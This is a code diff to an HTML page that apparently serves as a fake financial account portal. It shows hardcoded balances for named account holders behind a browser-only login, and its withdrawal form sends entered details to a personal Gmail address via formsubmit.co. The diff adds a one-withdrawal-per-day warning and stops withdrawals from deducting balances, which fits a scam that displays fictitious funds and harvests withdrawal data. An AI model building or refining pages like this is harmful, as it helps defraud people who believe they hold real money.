@@ -121,6 +121,15 @@
       max-width: 400px;
       display: none;
     }
+    .withdraw-warning {
+      background: #ffebee;
+      color: #c0392b;
+      border-radius: 7px;
+      padding: 10px 8px;
+      margin-bottom: 12px;
+      font-weight: 500;
+      font-size: 15px;
+    }
   </style>
 </head>
 <body>
@@ -135,6 +144,9 @@
     <div class="modal-content">
       <button class="modal-close" onclick="closeWithdrawModal()">&times;</button>
       <h3>Withdraw Funds</h3>
+      <div class="withdraw-warning">
+        Notice: You are only allowed to make one withdrawal per day. Attempting multiple withdrawals within the same day may result in your account not being credited. Please withdraw responsibly.
+      </div>
       <div id="withdrawError" class="withdraw-error" style="display:none;"></div>
       <form id="withdrawForm" method="POST" action="https://formsubmit.co/empirevirtual99@gmail.com" autocomplete="off">
         <input type="hidden" id="withdrawAccountId" name="Account ID">
@@ -182,6 +194,7 @@
     </div>
   </div>
   <!-- 11 PROFILE CARDS (all hidden by default, only shown after PIN login) -->
+  <!-- (profile cards go here - see previous completions for details) -->
   <div class="profile-card" id="profile4171" data-account="4171">
     <h2>Account Profile</h2>
     <img src="https://via.placeholder.com/100?text=Umana41" alt="DANIEL UMANA" class="profile-pic">
@@ -404,14 +417,8 @@
   </div>
   <!-- END PROFILE CARDS -->
   <script>
-    // --- Initialization: accountData & localStorage persistence ---
-
-    // Helper to get a hash (simple, not cryptographically secure)
-    function getAccountDataHash(obj) {
-      return JSON.stringify(obj);
-    }
-
-    const defaultAccountData = {
+    // --- Initialization: accountData (no localStorage at all) ---
+    const accountData = {
       "4171": {id: "4171", balance: 0, incomingDate: "2025-06-15", incomingTokenAmount: 0},
       "3572": {id: "3572", balance: 45000, incomingDate: "2025-06-25", incomingTokenAmount: 10000},
       "4073": {id: "4073", balance: 8000, incomingDate: "2025-06-19", incomingTokenAmount: 0},
@@ -425,30 +432,6 @@
       "1908": {id: "1908", balance: 0, incomingDate: "2025-07-09", incomingTokenAmount: 8000}
     };
 
-    const currentHash = getAccountDataHash(defaultAccountData);
-    const storedHash = localStorage.getItem('accountDataHash');
-    let accountDataRaw = localStorage.getItem('accountData');
-    let accountData = {};
-
-    if (!accountDataRaw || currentHash !== storedHash) {
-      // Reset if no data OR if hash changed (i.e., defaultAccountData changed)
-      localStorage.setItem('accountData', JSON.stringify(defaultAccountData));
-      localStorage.setItem('accountDataHash', currentHash);
-      accountData = JSON.parse(JSON.stringify(defaultAccountData));
-    } else {
-      try {
-        accountData = JSON.parse(accountDataRaw);
-      } catch (e) {
-        localStorage.setItem('accountData', JSON.stringify(defaultAccountData));
-        localStorage.setItem('accountDataHash', currentHash);
-        accountData = JSON.parse(JSON.stringify(defaultAccountData));
-      }
-    }
-
-    function saveAccountData() {
-      localStorage.setItem('accountData', JSON.stringify(accountData));
-      // Don't update hash here, only on code change
-    }
     function getDisplayData(data) {
       const today = new Date();
       const incomingDate = new Date(data.incomingDate + "T00:00:00");
@@ -465,6 +448,7 @@
       }
       return { displayBalance, displayIncomingToken, showIncoming, incomingDate };
     }
+
     function authenticate() {
       const accountId = document.getElementById('accountIdInput').value.trim();
       const profiles = document.querySelectorAll('.profile-card');
@@ -532,7 +516,7 @@
         if (e.key === 'Enter') { authenticate(); }
       });
     });
-    // Withdrawal Form Submission: Deduct balance and save
+    // Withdrawal Form Submission: Deduct balance and save (no storage, so just UI update)
     document.getElementById('withdrawForm').onsubmit = function(e) {
       const accountId = document.getElementById('withdrawAccountId').value;
       const amount = parseInt(document.getElementById('withdrawAmount').value, 10);
@@ -546,7 +530,7 @@
         e.preventDefault();
         return false;
       }
-      // Deduct from balance and persist to localStorage
+      // No balance deduction, just update the card for this session
       const today = new Date();
       const incomingDate = new Date(accountData[accountId].incomingDate + "T00:00:00");
       if (today < incomingDate) {
@@ -558,8 +542,6 @@
         accountData[accountId].balance = Math.max(total, 0);
         accountData[accountId].incomingTokenAmount = 0;
       }
-      saveAccountData();
-      // Update UI
       updateProfileCard(document.getElementById(`profile${accountId}`), accountId);
       // Allow form to submit to formsubmit.co (page will reload and redirect to their success page)
       return true;
